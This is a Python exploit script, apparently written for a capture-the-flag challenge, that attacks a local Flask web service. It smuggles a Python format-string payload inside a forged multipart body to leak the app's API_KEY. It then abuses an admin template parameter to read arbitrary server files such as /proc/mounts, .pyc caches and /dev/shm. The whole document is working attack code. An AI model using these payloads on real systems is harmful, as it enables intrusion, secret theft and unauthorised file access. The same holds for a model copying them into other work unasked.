import httpx
import re

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

def debug_format(payload):
    """通过 format string 读取属性（不调用函数）"""
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    if len(text) > 300:
        print(f"[-] Payload too long: {len(text)}")
        return None
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    try:
        r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
        return r.text
    except:
        return None

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 关键思路：利用 werkzeug/Flask 的某些缓存文件
    # 或者利用 Python 的 __pycache__
    
    print("\n[*] Checking /app/__pycache__/ ...")
    content, code = read_file_via_admin(api_key, "/app/__pycache__/")
    print(f"Status: {code}")
    
    # 尝试读取 .pyc 文件（二进制，但可能有路径信息）
    print("\n[*] Looking for .pyc files...")
    content, code = read_file_via_admin(api_key, "/app/__pycache__/app.cpython-313.pyc")
    if code == 200:
        print(f"Found .pyc file, length: {len(content)}")
        # 查找其中的路径
        paths = re.findall(rb'/[a-zA-Z0-9_\-/.]+', content.encode('latin-1') if isinstance(content, str) else content)
        print(f"Paths found: {paths[:10]}")
    
    # 重点：检查 flask session 或 werkzeug cache
    print("\n[*] Checking Flask/Werkzeug cache...")
    paths_to_check = [
        "/var/tmp/",
        "/run/user/1000/",
        "/home/ctf/.cache/",
        "/home/ctf/.local/",
    ]
    for p in paths_to_check:
        content, code = read_file_via_admin(api_key, p)
        if code == 200:
            print(f"[+] {p} accessible!")
    
    # 核心思路：检查 /sys/fs/cgroup 可能暴露的信息
    print("\n[*] Checking cgroup info...")
    content, code = read_file_via_admin(api_key, "/sys/fs/cgroup/memory/memory.stat")
    print(f"cgroup status: {code}")
    
    # 尝试 /proc/mounts 找可写目录
    print("\n[*] Looking for writable mounts...")
    content, code = read_file_via_admin(api_key, "/proc/mounts")
    if code == 200:
        for line in content.split('\n'):
            if 'rw' in line and ('tmp' in line.lower() or 'shm' in line.lower()):
                print(line)
    
    # 关键！尝试读取 /dev/shm 下的文件
    print("\n[*] Checking /dev/shm/...")
    content, code = read_file_via_admin(api_key, "/dev/shm/")
    print(f"/dev/shm status: {code}")
